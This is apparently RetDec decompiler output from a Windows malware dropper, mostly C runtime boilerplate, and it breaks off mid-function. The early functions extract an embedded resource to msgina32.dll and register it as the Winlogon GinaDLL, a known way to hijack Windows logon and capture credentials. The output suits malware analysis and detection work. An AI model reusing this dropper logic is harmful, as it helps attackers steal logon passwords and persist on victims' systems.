//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>

// ------------------------ Structures ------------------------

struct _EXCEPTION_POINTERS {
    struct _EXCEPTION_RECORD * e0;
    struct _CONTEXT * e1;
};

struct _EXCEPTION_RECORD {
    int32_t e0;
    int32_t e1;
    struct _EXCEPTION_RECORD * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5[1];
};

struct _M128A {
    int32_t e0;
    int64_t e1;
};

struct _CONTEXT {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
    int16_t e10;
    int16_t e11;
    int16_t e12;
    int16_t e13;
    int32_t e14;
    int32_t e15;
    int32_t e16;
    int32_t e17;
    int32_t e18;
    int32_t e19;
    int32_t e20;
    int32_t e21;
    int32_t e22;
    int32_t e23;
    int32_t e24;
    int32_t e25;
    int32_t e26;
    int32_t e27;
    int32_t e28;
    int32_t e29;
    int32_t e30;
    int32_t e31;
    int32_t e32;
    int32_t e33;
    int32_t e34;
    int32_t e35;
    int32_t e36;
    int32_t e37;
    int32_t e38;
    struct _M128A e39[26];
    int32_t e40;
    int32_t e41;
    int32_t e42;
    int32_t e43;
    int32_t e44;
    int32_t e45;
};

struct _OSVERSIONINFOA {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    char e5[128];
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _STARTUPINFOA {
    int32_t e0;
    char * e1;
    char * e2;
    char * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct _cpinfo {
    int32_t e0;
    char e1[1];
    char e2[1];
};

// ------------------- Function Prototypes --------------------

int32_t __callnewh(int32_t a1);
int32_t __FF_MSGBANNER(void);
int32_t __heap_alloc(uint32_t a1);
int32_t __NMSG_WRITE(int32_t a1);
int32_t _fflush(int32_t a1);
void _RtlUnwind_40_16(int32_t * TargetFrame, int32_t * TargetIp, struct _EXCEPTION_RECORD * ExceptionRecord, int32_t * ReturnValue);
int32_t entry_point(int32_t a1);
int32_t function_187e4d9(void);
int32_t function_287ad37(void);
int32_t function_287e307(void);
int32_t function_401000(char * lpData, int32_t cbData);
int32_t function_401080(int32_t a1);
int32_t function_4011d0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_401299(char * a1);
int32_t function_4012ca(int32_t a1);
int32_t function_401320(int32_t a1, uint32_t a2, int32_t result, int32_t a4);
int32_t function_40142a(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40144a(char * a1, char * a2);
int32_t function_401460(char * a1, int32_t a2);
int32_t function_40158b(int32_t a1);
int32_t function_4015ae(void);
int32_t function_4015af(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40163c(int32_t a1, int32_t a2);
int32_t function_401679(int32_t a1, int32_t a2, int32_t * a3);
int32_t function_401e17(int32_t a1, int32_t a2, int32_t result);
int32_t function_401e4c(int32_t result, int32_t a2);
int32_t function_401e7d(int32_t a1, int32_t result, int32_t a3);
int32_t function_401eb5(int32_t a1);
int32_t function_401ec2(int32_t a1);
int32_t function_401ed2(int32_t a1);
int32_t function_401ee0(void);
int32_t function_401f85(void);
int32_t function_401f99(int32_t lpMem);
int32_t function_402002(int32_t a1);
int32_t function_4020b5(int32_t a1);
int32_t function_40211b(int32_t a1);
int32_t function_402177(void);
int32_t function_4021ed(int32_t a1, int32_t a2);
int32_t function_402302(uint32_t a1, int32_t lpBuffer, uint32_t nNumberOfBytesToWrite);
int32_t function_4024b0(int32_t result5, uint32_t a2, uint32_t a3);
int32_t function_4027e5(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_402955(void);
int32_t function_4029cd(void);
int32_t function_4029fa(int32_t a1);
int32_t function_402a0b(int32_t a1);
int32_t function_402a1c(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402ab5(int32_t * a1, int32_t * a2);
int32_t function_402acf(int32_t a1, int32_t ExceptionInfo);
int32_t function_402c10(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402c53(void);
int32_t function_402d0c(void);
int32_t function_402da5(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5);
int32_t function_402f59(void);
int32_t function_40308b(int32_t a1);
int32_t function_403236(int32_t a1);
int32_t function_403263(void);
int32_t function_4033ab(int32_t a1);
int32_t function_4034d5(void);
int32_t function_4034f8(int32_t a1, int32_t a2, int32_t a3);
int32_t function_403816(uint32_t a1, int32_t a2);
int32_t function_403840(int32_t a1);
int32_t function_4038bb(int32_t lpMultiByteStr, int32_t a2);
int32_t function_403a15(int32_t a1, int32_t a2);
int32_t function_403ac6(void);
int32_t function_403b1e(int32_t a1);
int32_t function_403b66(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_403b91(int32_t a1, int32_t a2);
int32_t function_403eba(int32_t a1);
int32_t function_4041c3(int32_t a1);
int32_t function_404274(int32_t a1);
int32_t function_40436f(void);
int32_t function_4044b3(int32_t a1);
int32_t function_404509(int32_t a1);
int32_t function_4045cb(uint32_t a1, int32_t * a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_404622(int32_t a1, int32_t a2, int32_t a3);
int32_t function_404667(uint32_t a1);
int32_t function_40486f(int32_t a1, int32_t a2, uint32_t a3);
int32_t function_404993(int32_t a1);
int32_t function_4049fa(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, char a10, int32_t a11);
int32_t function_404a8f(uint32_t a1, int32_t hHandle);
int32_t function_404b06(uint32_t a1);
int32_t function_404b80(uint32_t a1);
int32_t function_404bbd(uint32_t a1);
int32_t function_404c14(uint32_t a1, int32_t lDistanceToMove, int32_t dwMoveMethod);
int32_t function_404cae(int32_t a1);
int32_t function_404cf2(int32_t lpFileName, uint32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_404fb0(int32_t a1);
int32_t function_404fc0(int32_t * a1, int32_t a2);
int32_t function_405021(int32_t a1, int32_t result, int32_t a3);
int32_t function_4050a0(int32_t a1);
int32_t function_405239(int32_t result, int32_t a2, int32_t a3, int32_t a4);
int32_t function_405283(int32_t a1);
int32_t function_4052b6(void);
int32_t function_4052df(void);
int32_t function_405464(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405480(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405497(int32_t a1, int32_t a2, uint32_t a3, int32_t a4);
int32_t function_4056a0(int32_t a1);
int32_t function_4056b0(int32_t a1, int32_t a2);
int32_t function_405770(int32_t * a1, int32_t * a2);
int32_t function_4057f0(char * a1, int32_t * a2, int32_t a3);
int32_t function_405830(int32_t result);
int32_t function_40585f(int32_t * a1, char * a2, int32_t a3);
int32_t function_4058f0(int32_t result, char * a2, int32_t a3);
int32_t function_405a09(void);
int32_t function_405a20(int32_t result, int32_t a2, int32_t a3);
int32_t function_405a80(int32_t a1, int32_t result5, uint32_t a3, uint32_t a4);
int32_t function_405db5(uint32_t a1, int32_t a2);
int32_t function_405efb(uint32_t a1, char * a2, int32_t a3);
int32_t function_4060f1(int32_t a1, int32_t a2, char * a3, int32_t a4, int32_t * a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_406315(int32_t a1, int32_t result);
int32_t function_406340(int32_t a1, char * a2, int32_t a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_406489(int32_t result, int32_t a2, int32_t a3);
int32_t function_406555(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4065ca(uint32_t a1, int32_t a2);

// --------------------- Global Variables ---------------------

int32_t g1 = 0x6000006; // 0x4070ec
char * g2; // 0x4074bc
int16_t * g3 = NULL; // 0x4074c0
int32_t g4 = 0; // 0x408000
int32_t g5 = 0; // 0x408004
int32_t g6 = 0; // 0x408008
int32_t g7 = 0; // 0x408014
int32_t g8 = 0; // 0x408018
int32_t g9 = 0; // 0x408020
int32_t g10 = 0; // 0x408024
int32_t g11 = 0; // 0x408028
char * g12[2] = {
    "BINARY",
    "TGAD"
}; // 0x408030
char (*g13)[5] = "TGAD"; // 0x408034
int32_t g14 = 1; // 0x4080c4
char (*g15)[7] = "(null)"; // 0x4080c8
int32_t g17 = 0; // 0x4080e0
int32_t g18 = 0; // 0x4080f0
int32_t g19 = 0; // 0x408110
bool g20 = false; // 0x408140
int32_t g21 = -0x3ffffffb; // 0x408350
int32_t g22 = 0; // 0x408358
int32_t g23 = 3; // 0x4083c8
int32_t g24 = 7; // 0x4083cc
int32_t g25 = 10; // 0x4083d0
int32_t g26 = 140; // 0x4083d4
int32_t g27 = -1; // 0x4083d8
int32_t g28 = 2; // 0x4083f8
char (*g29)[37] = "R6002\r\n- floating point not loaded\r\n"; // 0x4083fc
bool g30 = false; // 0x408488
int32_t g31; // 0x4084a8
int32_t g32; // 0x4086c0
int32_t g33; // 0x4086c4
int32_t g34 = -1; // 0x4086d0
int32_t g36 = 480; // 0x40a6e4
int32_t g37 = 1; // 0x40a6e8
int32_t g38 = 22; // 0x40a6ec
char * g39 = "\x01\x02\x04\b"; // 0x40a850
int32_t g40 = 932; // 0x40a858
int32_t g41 = -0x7d867da0; // 0x40a85c
char * g42 = "\xa6\xdf"; // 0x40a868
bool g43 = false; // 0x40a948
int32_t g44 = 1; // 0x40a950
char * g45; // 0x40a960
int32_t g46 = 0; // 0x40a968
int32_t g47 = 0; // 0x40a96c
int32_t g48 = 0; // 0x40a974
int32_t g49 = 0; // 0x40a978
int32_t g50 = 0; // 0x40a97c
int32_t g51 = 0; // 0x40a980
uint32_t g52 = 0; // 0x40a984
int32_t g53 = 0; // 0x40a988
int32_t g54 = 0; // 0x40a98c
int32_t g55 = 0; // 0x40a990
int32_t g56 = 0; // 0x40a994
int32_t g57 = 0; // 0x40a998
int32_t g58 = 0; // 0x40a9a0
int32_t g59 = 0; // 0x40a9a4
char * g60; // 0x40a9b0
char g61 = 0; // 0x40a9b8
int32_t g62 = 0; // 0x40a9bc
int32_t g63 = 0; // 0x40a9c0
int32_t g64 = 0; // 0x40a9c4
char * g65; // 0x40a9c8
int32_t g66 = 0; // 0x40aacc
int32_t g67 = 0; // 0x40aad4
int32_t g68 = 0; // 0x40aad8
int32_t g69 = 0; // 0x40aadc
int32_t g70 = 0; // 0x40aae0
int32_t g71 = 0; // 0x40aae4
int32_t g72 = 0; // 0x40aae8
int32_t g73 = 0; // 0x40aaec
int32_t g74 = 0; // 0x40aaf0
int32_t g75 = 0; // 0x40aafc
int32_t g76 = 0; // 0x40ab0c
int32_t g77 = 0; // 0x40ab14
int32_t g78 = 0; // 0x40ab18
int32_t g79 = 0; // 0x40ab1c
int32_t g80 = 0; // 0x40ab20
int32_t g81 = 0; // 0x40ab30
int32_t g82 = 0; // 0x40ab3c
char * g83; // 0x40ab40
char * g84; // 0x40ac40
char * g85; // 0x40ac41
int32_t g86 = 0; // 0x40ad44
int32_t g87 = 0; // 0x40ad48
int32_t g88 = 0; // 0x40ad4c
int32_t g89 = 0; // 0x40ad50
int32_t g90 = 0; // 0x40ad54
int32_t g91 = 0; // 0x40ad58
int32_t g92 = 0; // 0x40ad5c
int32_t g93 = 0; // 0x40ad60
int32_t g94 = 0; // 0x40ad64
int32_t g95 = 0; // 0x40ad68
int32_t g96 = 0; // 0x40ad80
int32_t g97 = 0; // 0x40ad84
bool g98 = false; // 0x40ae80
int32_t g99 = 0; // 0x40ae84
int32_t g100 = 0; // 0x40ae88
int32_t g101 = 0; // 0x40ae8c
int32_t g102 = 0; // 0x40ae90
int32_t g103 = 0; // 0x40ae98
int32_t g104 = 0; // 0x40aea0
int32_t g105 = 0; // 0x40bea0
char * g106; // 0x40bea4
int32_t g107;
int32_t g108;
int32_t g109;
int32_t g110;
int32_t g111;
int32_t g112;
int32_t g113;
int32_t g114;
int32_t g115;
int32_t g116;
int32_t g117;
int32_t g118;
int32_t * g16 = &g104; // 0x4080d0
int32_t * g35 = &g32; // 0x40a6e0

// ------------------------ Functions -------------------------

// Address range: 0x401000 - 0x40107f
int32_t function_401000(char * lpData, int32_t cbData) {
    // 0x401000
    int32_t phkResult; // bp-8, 0x401000
    int32_t v1 = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, NULL, 0, 0xf003f, NULL, (int32_t **)&phkResult, NULL); // 0x401021
    if (v1 != 0) {
        // 0x40107b
        return 1;
    }
    // 0x401032
    int32_t result; // 0x401000
    if (RegSetValueExA((int32_t *)phkResult, "GinaDLL", 0, 1, lpData, cbData) == 0) {
        // 0x401062
        function_401299("RI\n");
        CloseHandle((int32_t *)phkResult);
        result = 0;
    } else {
        // 0x401051
        CloseHandle((int32_t *)phkResult);
        result = 1;
    }
    // 0x40107b
    return result;
}

// Address range: 0x401080 - 0x4011c5
int32_t function_401080(int32_t a1) {
    // 0x401080
    if (a1 == 0) {
        // 0x4011bf
        return 0;
    }
    int32_t * hModule = (int32_t *)a1; // 0x4010c9
    int32_t * hResInfo = FindResourceA(hModule, g13, (char *)*(int32_t *)&g12); // 0x4010c9
    if (hResInfo == NULL) {
        // 0x4011bf
        return 0;
    }
    int32_t v1 = a1; // bp-56, 0x4010e6
    int32_t * hResData = LoadResource(hModule, hResInfo); // 0x4010e7
    char * v2 = NULL; // 0x4010f4
    int32_t v3 = &v1; // 0x4010f4
    if (hResData != NULL) {
        int32_t v4 = (int32_t)hResData; // bp-60, 0x4010fe
        int32_t * v5 = LockResource(hResData); // 0x4010ff
        v2 = NULL;
        v3 = &v4;
        if (v5 != NULL) {
            int32_t v6 = a1; // bp-68, 0x40111a
            uint32_t dwSize = SizeofResource(hModule, hResInfo); // 0x40111b
            v2 = NULL;
            v3 = &v6;
            if (dwSize != 0) {
                int32_t v7 = 0; // bp-84, 0x401137
                int32_t v8 = &v7; // 0x401137
                int32_t * memory = VirtualAlloc(NULL, dwSize, 0x1000, 4); // 0x401139
                v2 = (char *)memory;
                v3 = v8;
                if (memory != NULL) {
                    uint32_t v9 = dwSize / 4; // 0x401155
                    __asm_rep_movsd_memcpy((char *)memory, (char *)v5, v9);
                    bool v10; // 0x401080
                    char * v11 = (char *)(v9 * (v10 ? -4 : 4) + (int32_t)memory); // 0x40115f
                    __asm_rep_movsb_memcpy(v11, v11, dwSize & 3);
                    int32_t v12 = function_40144a("msgina32.dll", "wb"); // 0x40116b
                    function_401320((int32_t)v5, 1, dwSize, v12);
                    function_4012ca(v12);
                    function_401299("DR\n");
                    v2 = (char *)memory;
                    v3 = v8;
                }
            }
        }
    }
    // 0x4011bc
    *(int32_t *)(v3 - 4) = (int32_t)hResInfo;
    FreeResource(&g110);
    // 0x4011bf
    return (int32_t)v2;
}

// Address range: 0x4011d0 - 0x401299
int32_t function_4011d0(int32_t a1, int32_t a2, int32_t a3) {
    int32_t * moduleHandle = GetModuleHandleA(NULL); // 0x4011e5
    char lpFilename = 0; // bp-284, 0x4011f1
    int32_t v1; // bp-283, 0x4011d0
    __asm_rep_stosd_memset((char *)&v1, 0, 67);
    bool v2; // 0x4011d0
    *(char *)((v2 ? -268 : 268) + (int32_t)&v1) = 0;
    function_401080((int32_t)moduleHandle);
    GetModuleFileNameA(NULL, &lpFilename, 270);
    *(char *)function_401460(&lpFilename, 92) = 0;
    int32_t v3 = v2 ? -1 : 1;
    int32_t v4; // bp-1, 0x4011d0
    int32_t v5 = &v4; // 0x401258
    int32_t v6 = (int32_t)"\\msgina32.dll";
    int32_t v7 = 0; // 0x401258
    int32_t v8 = v6; // 0x401258
    while (v5 != 0) {
        int32_t v9 = v6 + v3; // 0x401258
        v5--;
        v7 = v5;
        v8 = v9;
        if (*(char *)v6 == 0) {
            // break ->
            break;
        }
        v6 = v9;
        v7 = 0;
        v8 = v6;
    }
    uint32_t v10 = -1 - v7;
    int32_t v11 = -1; // 0x401269
    int32_t v12 = &lpFilename;
    int32_t v13 = v12; // 0x401269
    while (v11 != 0) {
        int32_t v14 = v12 + v3; // 0x401269
        v11--;
        v13 = v14;
        if (*(char *)v12 == 0) {
            // break ->
            break;
        }
        v12 = v14;
        v13 = v12;
    }
    int32_t v15 = v13 - 1; // 0x40126b
    uint32_t v16 = v10 / 4; // 0x401270
    __asm_rep_movsd_memcpy((char *)v15, (char *)(v8 - v10), v16);
    char * v17 = (char *)(v15 + v16 * (v2 ? -4 : 4)); // 0x40127a
    __asm_rep_movsb_memcpy(v17, v17, v10 & 3);
    function_401000(&lpFilename, 260);
    return 0;
}

// Address range: 0x401299 - 0x4012ca
int32_t function_401299(char * a1) {
    // 0x401299
    int32_t v1; // 0x401299
    int32_t v2; // 0x401299
    int32_t v3; // 0x401299
    int32_t v4 = function_4015af((int32_t)&g18, v1, v2, v3); // 0x4012a2
    int32_t v5; // 0x401299
    int32_t result = function_401679((int32_t)&g18, (int32_t)a1, &v5); // 0x4012b3
    function_40163c(v4, (int32_t)&g18);
    return result;
}

// Address range: 0x4012ca - 0x401320
int32_t function_4012ca(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x4012d3
    int32_t v2 = *v1; // 0x4012d3
    if ((v2 & 64) != 0 || (v2 & 131) == 0) {
        // 0x401319
        *v1 = 0;
        return -1;
    }
    int32_t result = function_40211b(a1); // 0x4012e4
    function_4020b5(a1);
    if (function_402002(*(int32_t *)(a1 + 16)) < 0) {
        // 0x401319
        *v1 = 0;
        return -1;
    }
    int32_t * v3 = (int32_t *)(a1 + 28); // 0x401305
    int32_t v4 = *v3; // 0x401305
    if (v4 != 0) {
        // 0x40130c
        function_401f99(v4);
        *v3 = 0;
    }
    // 0x401319
    *v1 = 0;
    return result;
}

// Address range: 0x401320 - 0x40142a
int32_t function_401320(int32_t a1, uint32_t a2, int32_t result, int32_t a4) {
    int32_t v1 = result * a2; // 0x40132a
    if (v1 == 0) {
        // 0x401411
        return 0;
    }
    int32_t v2 = a4 + 12; // 0x401347
    int32_t * v3 = (int32_t *)(a4 + 24);
    int32_t v4 = 0x1000; // 0x40134d
    if ((*(int16_t *)v2 & 268) != 0) {
        // 0x40134f
        v4 = *v3;
    }
    // 0x40135e
    int32_t v5; // bp-20, 0x401320
    int32_t v6 = &v5; // 0x401326
    int32_t * v7 = (int32_t *)v2;
    int32_t * v8 = (int32_t *)(a4 + 4);
    int32_t * v9 = (int32_t *)(v6 - 4);
    int32_t * v10 = (int32_t *)(v6 - 8);
    int32_t * v11 = (int32_t *)a4;
    int32_t * v12 = (int32_t *)(v6 - 12);
    int32_t v13 = a1; // 0x401320
    int32_t v14 = v4; // 0x401320
    int32_t v15 = v1;
    int32_t v16; // 0x401320
    int32_t v17; // 0x401320
    int32_t v18; // 0x401320
    uint32_t v19; // 0x401320
    int32_t v20; // 0x401320
    int32_t v21; // 0x40135e
    while (true) {
      lab_0x40135e:
        // 0x40135e
        v17 = v15;
        v19 = v14;
        v20 = v13;
        v21 = *v7;
        if ((v21 & 264) == 0) {
            goto lab_0x401392;
        } else {
            uint32_t v22 = *v8; // 0x401369
            if (v22 == 0) {
                goto lab_0x401392;
            } else {
                int32_t v23 = v17 < v22 ? v17 : v22;
                *v9 = v23;
                *v10 = v20;
                *v12 = *v11;
                function_4024b0(v20, (int32_t)&g110, (int32_t)&g110);
                *v8 = *v8 - v23;
                *v11 = *v11 + v23;
                v16 = v23;
                v18 = v17 - v23;
                goto lab_0x4013d8;
            }
        }
    }
  lab_0x401421_3:;
    // 0x401411
    int32_t v24; // 0x401320
    return (v1 - v24) / a2;
  lab_0x401416_2:
    // 0x401416
    *v7 = *v7 | 32;
    goto lab_0x401421_3;
  lab_0x401392:;
    int32_t v25; // 0x401320
    if (v17 < v19) {
        // 0x4013dd
        *v9 = a4;
        *v10 = (int32_t)*(char *)v20;
        if (function_4021ed(v20, (int32_t)&g110) == -1) {
            // break -> 0x401421
            goto lab_0x401421_3;
        }
        int32_t v26 = *v3; // 0x4013f4
        v13 = v20 + 1;
        v14 = v26 >= 0 == (v26 != 0) ? v26 : 1;
        v25 = v17 - 1;
        goto lab_0x401406;
    } else {
        if ((v21 & 264) != 0) {
            // 0x40139b
            *v9 = a4;
            if (function_40211b(v20) != 0) {
                // break -> 0x401421
                goto lab_0x401421_3;
            }
        }
        int32_t v27 = v17; // 0x4013aa
        if (v19 != 0) {
            // 0x4013ac
            v27 = v17 - v17 % v19;
        }
        // 0x4013bb
        *v9 = v27;
        *v10 = v20;
        *v12 = *(int32_t *)(a4 + 16);
        int32_t v28 = function_402302((int32_t)&g110, (int32_t)&g110, (int32_t)&g110); // 0x4013c2
        v24 = v17;
        if (v28 == -1) {
            goto lab_0x401416_2;
        }
        int32_t v29 = v17 - v28; // 0x4013d2
        v16 = v28;
        v18 = v29;
        v24 = v29;
        if (v28 < v27) {
            goto lab_0x401416_2;
        }
        goto lab_0x4013d8;
    }
  lab_0x401406:
    // 0x401406
    v15 = v25;
    if (v15 == 0) {
        // 0x401411
        return result;
    }
    goto lab_0x40135e;
  lab_0x4013d8:
    // 0x4013d8
    v13 = v16 + v20;
    v14 = v19;
    v25 = v18;
    goto lab_0x401406;
}

// Address range: 0x40142a - 0x40144a
int32_t function_40142a(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = function_402955(); // 0x40142a
    if (result != 0) {
        // 0x401434
        return function_4027e5(a1, a2, a3, result);
    }
    // 0x401433
    return result;
}

// Address range: 0x40144a - 0x40145d
int32_t function_40144a(char * a1, char * a2) {
    // 0x40144a
    return function_40142a((int32_t)a1, (int32_t)a2, 64);
}

// Address range: 0x401460 - 0x401487
int32_t function_401460(char * a1, int32_t a2) {
    int32_t v1 = -1; // 0x40146c
    int32_t v2 = (int32_t)a1;
    int32_t v3 = 0; // 0x40146c
    int32_t v4 = v2; // 0x40146c
    while (v1 != 0) {
        bool v5; // 0x401460
        int32_t v6 = v2 + (v5 ? -1 : 1); // 0x40146c
        v1--;
        v3 = v1;
        v4 = v6;
        if (*(char *)v2 == 0) {
            // break ->
            break;
        }
        v2 = v6;
        v3 = 0;
        v4 = v2;
    }
    char v7 = a2;
    int32_t v8 = -1 - v3; // 0x401476
    int32_t v9 = v4 - 1;
    int32_t v10 = v9; // 0x401476
    while (v8 != 0) {
        int32_t v11 = v9 - 1; // 0x401476
        v8--;
        v10 = v11;
        if (*(char *)v9 == v7) {
            // break -> 0x401483
            break;
        }
        v9 = v11;
        v10 = v9;
    }
    int32_t v12 = v10 + 1; // 0x401478
    return *(char *)v12 == v7 ? v12 : 0;
}

// Address range: 0x401487 - 0x40155b
int32_t entry_point(int32_t a1) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x40149c
    __writefsdword(0, (int32_t)&v1);
    uint32_t v2 = GetVersion(); // 0x4014ad
    int32_t v3 = v2 / 256 & 255; // 0x4014b5
    g55 = v3;
    int32_t v4 = v2 & 255; // 0x4014bf
    g54 = v4;
    g53 = 256 * v4 | v3;
    g52 = v2 / 0x10000;
    if (function_4033ab(0) == 0) {
        // 0x4014ea
        function_40158b(28);
        // UNREACHABLE
    }
    // 0x4014f2
    function_40308b(0);
    g106 = GetCommandLineA();
    g45 = (char *)function_402f59();
    function_402d0c();
    function_402c53();
    function_4029cd();
    g59 = g58;
    function_4029fa(function_4011d0(g56, g57, g58));
    int32_t v5; // 0x401487
    return function_402acf(*(int32_t *)*(int32_t *)v5, v5);
}

// Address range: 0x40158b - 0x4015ae
int32_t function_40158b(int32_t a1) {
    // 0x40158b
    if (g46 != 2) {
        // 0x401594
        __FF_MSGBANNER();
    }
    // 0x401599
    __NMSG_WRITE(a1);
    ExitProcess(255);
    // UNREACHABLE
}

// Address range: 0x4015ae - 0x4015af
int32_t function_4015ae(void) {
    // 0x4015ae
    int32_t result; // 0x4015ae
    return result;
}

// Address range: 0x4015af - 0x40163c
int32_t function_4015af(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4015af
    int32_t v1; // 0x4015af
    if (function_403816(*(int32_t *)(a1 + 16), v1) == 0) {
        // 0x401638
        return 0;
    }
    int32_t v2 = &g47; // 0x4015c7
    if (a1 != (int32_t)&g18) {
        // 0x4015cd
        v2 = (int32_t)&g47 + 4;
        if (a1 != (int32_t)&g19) {
            // 0x401638
            return 0;
        }
    }
    // 0x4015d8
    g48++;
    int16_t * v3 = (int16_t *)(a1 + 12); // 0x4015de
    if ((*v3 & 268) != 0) {
        // 0x401638
        return 0;
    }
    int32_t * v4 = (int32_t *)v2; // 0x4015e6
    int32_t v5 = *v4; // 0x4015e6
    int32_t v6 = v5; // 0x4015fc
    if (v5 == 0) {
        int32_t * v7 = _malloc(0x1000); // 0x4015ff
        v6 = (int32_t)v7;
        *v4 = v6;
        if (v7 == NULL) {
            int32_t v8 = a1 + 20; // 0x40160b
            *(int32_t *)(a1 + 8) = v8;
            *(int32_t *)a1 = v8;
            *(int32_t *)(a1 + 24) = 2;
            *(int32_t *)(a1 + 4) = 2;
            // 0x40162b
            *v3 = *v3 | 0x1102;
            return 1;
        }
    }
    // 0x40161e
    *(int32_t *)(a1 + 24) = 0x1000;
    *(int32_t *)(a1 + 8) = v6;
    *(int32_t *)a1 = v6;
    *(int32_t *)(a1 + 4) = 0x1000;
    // 0x40162b
    *v3 = *v3 | 0x1102;
    return 1;
}

// Address range: 0x40163c - 0x401679
int32_t function_40163c(int32_t a1, int32_t a2) {
    char * v1 = (char *)(a2 + 13);
    char v2 = *v1;
    int32_t result2; // 0x40163c
    if (a1 == 0) {
        // 0x401666
        result2 = a2;
        if ((v2 & 16) != 0) {
            // 0x401670
            result2 = function_40211b(a2);
        }
    } else {
        if ((v2 & 16) != 0) {
            int32_t result = function_40211b(a2); // 0x40164f
            *v1 = *v1 & -18;
            *(int32_t *)(a2 + 24) = 0;
            *(int32_t *)a2 = 0;
            *(int32_t *)(a2 + 8) = 0;
            return result;
        }
    }
    // 0x401677
    return result2;
}

// Address range: 0x401679 - 0x401df7
int32_t function_401679(int32_t a1, int32_t a2, int32_t * a3) {
    int32_t v1 = (int32_t)a3;
    char v2 = *(char *)a2; // 0x40168d
    int32_t result = 0; // bp-24, 0x401692
    if (v2 == 0) {
        // 0x401def
        return 0;
    }
    int32_t v3 = &v1;
    int32_t v4; // bp-592, 0x401679
    int32_t v5 = &v4;
    int32_t v6; // bp-80, 0x401679
    int32_t v7 = &v6;
    int32_t v8 = &result;
    char v9; // bp-26, 0x401679
    int32_t v10 = &v9;
    int32_t v11; // bp-72, 0x401679
    int32_t v12 = &v11;
    int32_t v13 = a2; // 0x401679
    int32_t v14; // bp-604, 0x401679
    int32_t v15 = &v14; // 0x401679
    char v16 = v2; // 0x401de1
    int32_t v17 = 0; // 0x401679
    int32_t v18 = 0; // 0x401679
    int32_t v19; // 0x401679
    char v20; // 0x401679
    int32_t v21; // 0x401679
    int32_t v22; // 0x401679
    int32_t v23; // 0x401679
    char * v24; // 0x401679
    int32_t v25; // 0x401679
    char * v26; // 0x401679
    int32_t v27; // 0x401679
    int32_t v28; // 0x401679
    int32_t v29; // 0x401679
    int32_t v30; // 0x401679
    int32_t v31; // 0x401679
    int32_t v32; // 0x401679
    char (*v33)[7]; // 0x401679
    char (*v34)[7]; // 0x401679
    char (*v35)[7]; // 0x401679
    char (*v36)[7]; // 0x401679
    int32_t v37; // 0x401679
    int32_t v38; // 0x401679
    int32_t v39; // 0x401679
    int32_t v40; // 0x401679
    int32_t v41; // 0x401679
    int32_t v42; // 0x401679
    int32_t v43; // 0x401679
    int32_t v44; // 0x401679
    int32_t v45; // 0x401679
    int32_t v46; // 0x401679
    int32_t v47; // 0x401679
    int32_t v48; // 0x401679
    int32_t v49; // 0x401679
    int32_t v50; // 0x401679
    int32_t v51; // 0x401679
    int32_t v52; // 0x401679
    int32_t v53; // 0x401679
    int32_t v54; // 0x401679
    int32_t v55; // 0x401679
    int32_t v56; // 0x401679
    int32_t v57; // 0x401679
    int32_t v58; // 0x401679
    int32_t v59; // 0x401679
    int32_t v60; // 0x401679
    int32_t v61; // 0x401679
    int32_t v62; // 0x401679
    int32_t v63; // 0x401679
    int32_t v64; // 0x401679
    int32_t v65; // 0x401679
    int32_t v66; // 0x401679
    char v67; // 0x401679
    char v68; // 0x401679
    char v69; // 0x401679
    char v70; // 0x401679
    int16_t v71; // 0x401679
    int16_t v72; // 0x401679
    int16_t v73; // 0x401679
    int16_t v74; // 0x401679
    int16_t v75; // 0x401679
    int16_t v76; // 0x401679
    int16_t v77; // 0x401679
    int32_t v78; // 0x401679
    int32_t v79; // 0x4019b5
    int32_t * v80; // 0x4019b5
    while (true) {
      lab_0x4016c4:
        // 0x4016c4
        v37 = v18;
        v28 = v27;
        v63 = v62;
        v59 = v58;
        v46 = v45;
        v41 = v40;
        v72 = v71;
        v49 = v48;
        v68 = v67;
        v34 = v33;
        v54 = v53;
        v20 = v16;
        v22 = v15;
        v25 = v13;
        int32_t v81 = 0; // 0x4016c7
        if (v20 <= 120) {
            char v82 = *(char *)((int32_t)v20 + (int32_t)"zy"); // 0x4016d1
            v81 = v82 & 15;
        }
        // 0x4016de
        v19 = v20;
        v24 = (char *)(v25 + 1);
        char v83 = *(char *)(v17 + (int32_t)&g1 + 8 * v81); // 0x4016de
